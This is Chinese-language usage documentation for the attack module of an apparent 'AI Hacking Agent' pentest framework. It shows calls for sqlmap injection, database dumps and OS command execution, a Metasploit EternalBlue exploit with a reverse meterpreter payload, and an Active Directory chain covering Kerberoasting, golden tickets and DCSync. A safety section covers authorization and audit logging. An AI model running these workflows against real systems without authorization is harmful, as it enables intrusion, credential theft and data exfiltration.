# 实战能力模块使用文档

## 概述

实战能力模块是 AI Hacking Agent 的核心功能，提供从漏洞扫描到漏洞利用的全流程自动化能力。包含5大模块、22个API端点、4个一键攻击模板。

## 模块架构

```
combat/
├── __init__.py                    # 实战包初始化
├── sqlmap/                        # SQL注入模块
│   ├── __init__.py
│   └── integrator.py              # sqlmap集成器
├── metasploit/                    # Metasploit模块
│   ├── __init__.py
│   └── enhanced.py                # Metasploit增强集成
├── ad_attack/                     # AD域攻击模块
│   ├── __init__.py
│   └── chain_executor.py          # AD攻击链执行器
├── web_exploit/                   # Web漏洞利用模块
│   ├── __init__.py
│   └── scanner.py                 # Web深度漏洞扫描器
└── workflow/                      # 工作流模块
    ├── __init__.py
    └── attack_templates.py        # 一键攻击模板引擎
```

## 快速开始

### 1. 访问Web界面

启动API服务后，访问：
- **实战能力中心**: http://127.0.0.1:8000/combat-console
- **统一控制台**: http://127.0.0.1:8000/console-v7

### 2. API调用示例

```bash
# 查看实战能力状态
curl http://127.0.0.1:8000/api/v1/combat/status

# 列出攻击模板
curl http://127.0.0.1:8000/api/v1/combat/templates

# 执行Web渗透模板（试运行）
curl -X POST http://127.0.0.1:8000/api/v1/combat/templates/execute \
  -H "Content-Type: application/json" \
  -d '{"template_id":"web_pentest_standard","target":"http://example.com","dry_run":true}'
```

### 3. Python代码调用

```python
from combat.sqlmap.integrator import SQLMapIntegrator
from combat.web_exploit.scanner import WebExploitScanner
from combat.workflow.attack_templates import AttackTemplateEngine

# SQL注入扫描
integrator = SQLMapIntegrator()
result = integrator.scan('http://target.com/page?id=1')
print(f"是否存在注入: {result.vulnerable}")
print(f"数据库类型: {result.db_type}")

# Web漏洞扫描
scanner = WebExploitScanner(target_url='http://target.com')
result = scanner.scan_all()
print(f"发现漏洞数: {result.vulnerability_count}")

# 一键攻击模板
engine = AttackTemplateEngine()
result = engine.execute_template(
    'web_pentest_standard',
    target='http://target.com',
    dry_run=True
)
print(f"执行状态: {result.status}")
```

## 模块详细说明

### 1. SQL注入模块 (sqlmap)

**功能：**
- SQL注入自动检测（布尔盲注、时间盲注、错误注入、UNION注入）
- 数据库指纹识别（MySQL、PostgreSQL、SQL Server、Oracle、SQLite等）
- 数据库Dump（数据库列表、表列表、列列表、数据导出）
- OS命令执行（通过SQL注入执行系统命令）
- 文件读写（读取/写入服务器文件）

**API端点：**
| 方法 | 端点 | 功能 |
|------|------|------|
| POST | /api/v1/combat/sql/scan | SQL注入扫描 |
| POST | /api/v1/combat/sql/dump | 数据库Dump |
| POST | /api/v1/combat/sql/os-command | OS命令执行 |

**配置：**
```ini
[sqlmap]
sqlmap_path =              # sqlmap.py路径（留空自动查找）
default_level = 3          # 默认测试级别 (1-5)
default_risk = 2           # 默认风险级别 (1-3)
default_timeout = 300      # 默认超时时间（秒）
```

**使用示例：**
```python
from combat.sqlmap.integrator import SQLMapIntegrator

integrator = SQLMapIntegrator()

# 扫描SQL注入
result = integrator.scan(
    url='http://target.com/page?id=1',
    parameters=['id'],
    level=3,
    risk=2
)

if result.vulnerable:
    print(f"数据库类型: {result.db_type}")
    print(f"注入类型: {result.injection_types}")
    print(f"数据库: {result.databases}")

# Dump数据库
dump_result = integrator.dump(
    url='http://target.com/page?id=1',
    database='target_db',
    tables=['users', 'products']
)

# OS命令执行
cmd_result = integrator.os_command(
    url='http://target.com/page?id=1',
    command='whoami'
)
```

### 2. Metasploit模块 (metasploit)

**功能：**
- 完整RPC API封装
- 漏洞利用模块搜索/加载/执行
- Payload生成和配置
- Session管理（Meterpreter/Shell）
- 后渗透模块执行
- 快速利用（按端口自动选择模块）

**API端点：**
| 方法 | 端点 | 功能 |
|------|------|------|
| POST | /api/v1/combat/msf/exploit | 漏洞利用 |
| POST | /api/v1/combat/msf/quick | 快速利用 |
| GET | /api/v1/combat/msf/sessions | 会话列表 |
| POST | /api/v1/combat/msf/session/{id}/execute | 会话命令执行 |
| GET | /api/v1/combat/msf/search | 模块搜索 |

**前置条件：**
需要本地运行Metasploit并启动RPC服务：
```bash
msfconsole
load msgrpc ServerHost=127.0.0.1 ServerPort=55553 User=msf Pass=msf
```

**配置：**
```ini
[metasploit]
rpc_host = 127.0.0.1
rpc_port = 55553
rpc_username = msf
rpc_password = msf
use_ssl = false
default_lhost = 127.0.0.1
default_lport = 4444
```

**使用示例：**
```python
from combat.metasploit.enhanced import MetasploitEnhanced

msf = MetasploitEnhanced(
    host='127.0.0.1',
    port=55553,
    username='msf',
    password='msf'
)

# 连接
msf.connect()

# 搜索模块
modules = msf.search_modules('ms17_010')
print(f"找到 {len(modules)} 个模块")

# 执行漏洞利用
result = msf.execute_exploit(
    module='exploit/windows/smb/ms17_010_eternalblue',
    options={'RHOSTS': '192.168.1.1', 'RPORT': '445'},
    payload='windows/meterpreter/reverse_tcp',
    payload_options={'LHOST': '192.168.1.100', 'LPORT': '4444'}
)

# 查看会话
sessions = msf.list_sessions()
for session in sessions:
    print(f"会话 #{session.id}: {session.type} - {session.target_host}")

# 执行后渗透命令
output = msf.execute_session_command(session_id=1, command='sysinfo')
print(output)
```

### 3. AD域攻击链模块 (ad_attack)

**功能：**
9阶段完整攻击链：
1. **域信息收集** - 用户、计算机、组、OU枚举
2. **SPN枚举** - 服务主体名称发现
3. **无预认证用户枚举** - AS-REP Roasting目标发现
4. **Kerberoasting** - 请求服务票据并破解
5. **AS-REP Roasting** - 无预认证用户票据获取
6. **哈希传递** - Pass-the-Hash攻击
7. **黄金票据** - 伪造TGT票据
8. **DCSync** - 域控数据同步
9. **攻击路径分析** - 完整攻击路径可视化

**API端点：**
| 方法 | 端点 | 功能 |
|------|------|------|
| POST | /api/v1/combat/ad/full-chain | 完整攻击链 |
| POST | /api/v1/combat/ad/kerberoast | Kerberoasting |
| POST | /api/v1/combat/ad/asrep-roast | AS-REP Roasting |
| POST | /api/v1/combat/ad/golden-ticket | 黄金票据 |
| POST | /api/v1/combat/ad/dcsync | DCSync |

**使用示例：**
```python
from combat.ad_attack.chain_executor import ADAttackChain

chain = ADAttackChain(
    dc_ip='192.168.1.1',
    domain='test.local',
    username='jdoe',
    password='Password123!'
)

# 执行完整攻击链
result = chain.execute_full_chain()

print(f"用户数: {len(result.users)}")
print(f"计算机数: {len(result.computers)}")
print(f"Kerberoasting结果: {len(result.kerberoast_results)}")
print(f"AS-REP结果: {len(result.asrep_results)}")
print(f"攻击路径: {list(result.attack_paths.keys())}")

# 单独执行Kerberoasting
kerb_results = chain.kerberoast()
for result in kerb_results:
    print(f"用户: {result.username}, SPN: {result.spn}")
    print(f"票据哈希: {result.ticket_hash}")

# 生成黄金票据
ticket = chain.generate_golden_ticket(
    krbtgt_hash='568d1f2f...',
    username='Administrator',
    domain_sid='S-1-5-21-xxx'
)
print(f"票据已生成: {ticket.generated}")
```

### 4. Web深度漏洞扫描器 (web_exploit)

**功能：**
8类漏洞检测：
1. **SQL注入** - 布尔盲注、时间盲注、错误注入
2. **XSS** - 反射型、存储型、过滤绕过
3. **SSRF** - 服务端请求伪造、AWS元数据、Redis探测
4. **文件上传** - 上传绕过、WebShell检测
5. **命令注入** - OS命令注入、代码注入
6. **目录遍历** - 路径遍历、文件包含
7. **开放重定向** - URL重定向漏洞
8. **技术栈识别** - Web服务器、框架、CMS识别

**API端点：**
| 方法 | 端点 | 功能 |
|------|------|------|
| POST | /api/v1/combat/web/scan | 全面扫描 |
| POST | /api/v1/combat/web/scan/sql-injection | SQL注入检测 |
| POST | /api/v1/combat/web/scan/xss | XSS检测 |
| POST | /api/v1/combat/web/scan/ssrf | SSRF检测 |

**使用示例：**
```python
from combat.web_exploit.scanner import WebExploitScanner

scanner = WebExploitScanner(
    target_url='http://target.com',
    timeout=10,
    verify_ssl=False
)

# 全面扫描
result = scanner.scan_all()
print(f"目标: {result.target_url}")
print(f"技术栈: {result.tech_stack}")
print(f"发现漏洞: {result.vulnerability_count}")
print(f"高危漏洞: {len(result.high_severity_vulns)}")

for vuln in result.vulnerabilities:
    print(f"[{vuln.severity.upper()}] {vuln.type}: {vuln.url}")
    print(f"  参数: {vuln.parameter}")
    print(f"  CWE: {vuln.cwe}")
    print(f"  CVSS: {vuln.cvss}")

# 单独检测SQL注入
sql_results = scanner.detect_sql_injection('http://target.com/page?id=1')
print(f"SQL注入漏洞: {len(sql_results)}")

# 单独检测XSS
xss_results = scanner.detect_xss('http://target.com/search?q=test')
print(f"XSS漏洞: {len(xss_results)}")
```

### 5. 一键攻击模板引擎 (workflow)

**功能：**
- 4个预设攻击模板
- 工作流引擎（依赖拓扑排序、条件分支、失败重试）
- 人工审核节点
- 进度跟踪
- 自定义模板创建

**预设模板：**

| 模板ID | 名称 | 任务数 | 预估时间 | 风险等级 |
|--------|------|--------|----------|----------|
| web_pentest_standard | Web渗透标准流程 | 10 | 1-2小时 | 高 |
| internal_pentest_standard | 内网渗透标准流程 | 9 | 2-4小时 | 严重 |
| ad_attack_chain | AD域完整攻击链 | 10 | 1-3小时 | 严重 |
| quick_vuln_scan | 快速漏洞扫描 | 4 | 15-30分钟 | 中 |

**API端点：**
| 方法 | 端点 | 功能 |
|------|------|------|
| GET | /api/v1/combat/templates | 模板列表 |
| GET | /api/v1/combat/templates/{id} | 模板详情 |
| POST | /api/v1/combat/templates/execute | 执行模板 |
| GET | /api/v1/combat/executions | 执行记录 |

**使用示例：**
```python
from combat.workflow.attack_templates import AttackTemplateEngine

engine = AttackTemplateEngine()

# 列出所有模板
templates = engine.list_templates()
for t in templates:
    print(f"{t['id']}: {t['name']} ({t['task_count']}个任务)")

# 获取模板详情
template = engine.get_template('web_pentest_standard')
print(f"模板: {template.name}")
print(f"描述: {template.description}")
print(f"任务数: {len(template.tasks)}")
for task in template.tasks:
    print(f"  - {task.name} ({task.type})")

# 执行模板（试运行）
result = engine.execute_template(
    template_id='web_pentest_standard',
    target='http://target.com',
    dry_run=True
)

print(f"执行ID: {result.execution_id}")
print(f"状态: {result.status}")
print(f"成功任务: {result.success_count}")
print(f"失败任务: {result.failed_count}")

# 创建自定义模板
custom_tasks = [
    {'id': '1', 'name': '信息收集', 'type': 'recon'},
    {'id': '2', 'name': '漏洞扫描', 'type': 'scan', 'dependencies': ['1']},
    {'id': '3', 'name': '漏洞利用', 'type': 'exploit', 'dependencies': ['2']},
    {'id': '4', 'name': '报告生成', 'type': 'report', 'dependencies': ['3']},
]

template = engine.create_custom_template(
    template_id='my_custom_template',
    name='我的自定义渗透流程',
    tasks=custom_tasks,
    description='自定义渗透测试工作流',
    category='custom'
)
```

## 配置文件

配置文件路径：`config/combat_config.ini`

```ini
[sqlmap]
sqlmap_path = 
default_level = 3
default_risk = 2
default_timeout = 300

[metasploit]
rpc_host = 127.0.0.1
rpc_port = 55553
rpc_username = msf
rpc_password = msf
use_ssl = false

[ad_attack]
default_dc_ip = 
default_domain = 
default_username = 
default_password = 

[web_scanner]
default_timeout = 10
verify_ssl = false
follow_redirects = true
max_concurrent = 10

[workflow]
max_retries = 2
on_failure = continue
enable_approval = true

[security]
enable_combat = true
allowed_targets = 
denied_targets = 127.0.0.1, localhost
enable_audit_log = true
max_execution_time = 3600
```

## 安全注意事项

### 1. 合法使用
- 仅在获得明确授权的目标上使用
- 遵守当地法律法规
- 保留操作日志用于审计

### 2. 目标限制
- 配置 `allowed_targets` 限制可扫描的IP范围
- 默认禁止扫描 `127.0.0.1` 和 `localhost`
- 生产环境建议启用目标白名单

### 3. 审计日志
- 所有实战操作都会记录到 `logs/combat_audit.log`
- 日志包含：时间、用户、操作类型、目标、结果
- 建议定期备份审计日志

### 4. 执行时间限制
- 默认最大执行时间为3600秒（1小时）
- 超过时间的任务会被自动终止
- 可在配置文件中调整

## 常见问题

### Q: sqlmap未安装怎么办？
A: 模块会自动降级为模拟模式，返回示例数据用于演示和测试。安装sqlmap后自动启用真实扫描。

### Q: Metasploit连接失败？
A: 确保已启动msfconsole并加载msgrpc插件：
```bash
msfconsole
load msgrpc ServerHost=127.0.0.1 ServerPort=55553 User=msf Pass=msf
```

### Q: 如何添加自定义攻击模板？
A: 使用 `AttackTemplateEngine.create_custom_template()` 方法，或通过API `POST /api/v1/combat/templates` 创建。

### Q: 如何查看执行历史？
A: 访问 `GET /api/v1/combat/executions` 查看所有执行记录，或在Web界面的"执行记录"页面查看。

## API参考

完整API文档请访问：http://127.0.0.1:8000/docs

在Swagger UI中找到 **"实战能力"** 分类查看所有22个端点。

## 更新日志

### v1.0.0 (2026-08-31)
- 初始版本
- 5大实战模块
- 22个API端点
- 4个一键攻击模板
- Web实战控制台
- 完整单元测试
